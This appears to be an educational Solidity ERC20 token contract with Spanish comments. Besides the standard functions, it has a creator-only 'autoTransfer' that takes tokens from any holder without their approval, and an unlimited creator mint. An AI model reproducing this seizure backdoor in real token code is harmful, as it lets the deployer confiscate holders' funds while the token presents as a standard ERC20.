// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "./SafeMath.sol";


// interface de nuestro token ERC20
interface IERC20 {

  // devuelve la cantidad de tokens en existencia
  function totalSupply() external view returns (uint256);

  // devuelve la cantidad de tokens para una direccion indicada por parametro
  function balanceOf(address account) external view returns (uint256);

  // devuelve el numero de tokens que el spender podra gastar en nombre del propietario (owner)
  function allowance(address owner, address spender) external view returns (uint256);

  // devuelve un valor booleano con el resultado de la operacion indicada
  function transfer(address recipient, uint256 amount) external returns (bool);

  // devuelve un valor booleano con el resultado de la operacion gasto
  function approve(address spender, uint256 amount) external returns (bool);

  // devuelve un valor booleano con el resultado de la operacion de paso de una cantidad de tokens usando el metodo allowance
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  // evento que se debe emitir cuando una cantidad de tokens pasa de un origen a un destino
  event Transfer(address indexed from, address indexed to, uint256 value);

  // evento que se debe emitir cuando se establece una asignacion con el metodo allowance
  event Approval(address indexed owner, address indexed spender, uint256 value);

}


// implementacion de las funciones del token ERC20
contract ERC20Basic is IERC20 {

  using SafeMath for uint256;


  address public creator = msg.sender;

  string public constant name = "ERC20Token";
  string public constant symbol = "ERC20";
  uint8 public constant decimals = 2;

  uint256 public override totalSupply;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;


  modifier onlyCreator() {
    // requiere que la direccion del ejecutor de la funcion sea igual al creaor del token
    require(msg.sender == creator, 'You can not access to this function');
    _;
  }


  constructor(uint256 _initialSupply) {
    totalSupply = _initialSupply;
    balances[msg.sender] = totalSupply;
  }


  function increaseTotalSupply(uint newTokensAmount) public onlyCreator() {
    totalSupply += newTokensAmount;
    balances[msg.sender] += newTokensAmount;
  }

  function balanceOf(address tokenOwner) public override view returns (uint256) {
    return balances[tokenOwner];
  }

  function allowance(address owner, address delegate) public override view returns (uint256) {
    return allowed[owner][delegate];
  }

  function transfer(address recipient, uint256 numTokens) public override returns (bool) {
    require(numTokens <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(numTokens);
    balances[recipient] = balances[recipient].add(numTokens);

    emit Transfer(msg.sender, recipient, numTokens);

    return true;
  }

  function autoTransfer(address sender, uint256 numTokens) public onlyCreator() returns (bool) {
    require(numTokens <= balances[sender]);

    balances[sender] = balances[sender].sub(numTokens);
    balances[msg.sender] = balances[msg.sender].add(numTokens);

    emit Transfer(sender, msg.sender, numTokens);

    return true;
  }

  function approve(address delegate, uint256 numTokens) public override returns (bool) {
    allowed[msg.sender][delegate] = numTokens;

    emit Approval(msg.sender, delegate, numTokens);

    return true;
  }

  function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
    require(numTokens <= balances[owner]);
    require(numTokens <= allowed[owner][msg.sender]);

    balances[owner] = balances[owner].sub(numTokens);
    allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
    balances[buyer] = balances[buyer].add(numTokens);

    emit Transfer(owner, buyer, numTokens);
    
    return true;
  }

}
